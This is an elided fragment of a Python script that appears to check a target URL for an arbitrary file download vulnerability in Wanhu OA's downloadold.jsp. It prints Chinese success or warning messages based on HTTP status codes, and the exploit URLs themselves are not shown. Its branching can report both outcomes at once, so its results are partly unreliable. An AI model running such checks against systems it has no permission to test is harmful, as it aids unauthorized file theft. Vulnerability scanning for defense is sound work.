...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测万户OA downloadold.jsp 任意文件下载漏洞")
    try:
        ...
        if respones1.status_code == 200:
            print(now_time() + ' [SUCCESS]  万户OA downloadold.jsp 任意文件下载漏洞存在{}'.format(exp_url1))
        if respones2.status_code == 200:
            print(now_time() + ' [SUCCESS]  万户OA downloadold.jsp 任意文件下载漏洞存在{}'.format(exp_url2))
        else:
            print(now_time() + ' [WARNING]  万户OA downloadold.jsp 任意文件下载漏洞不存在')
    except:
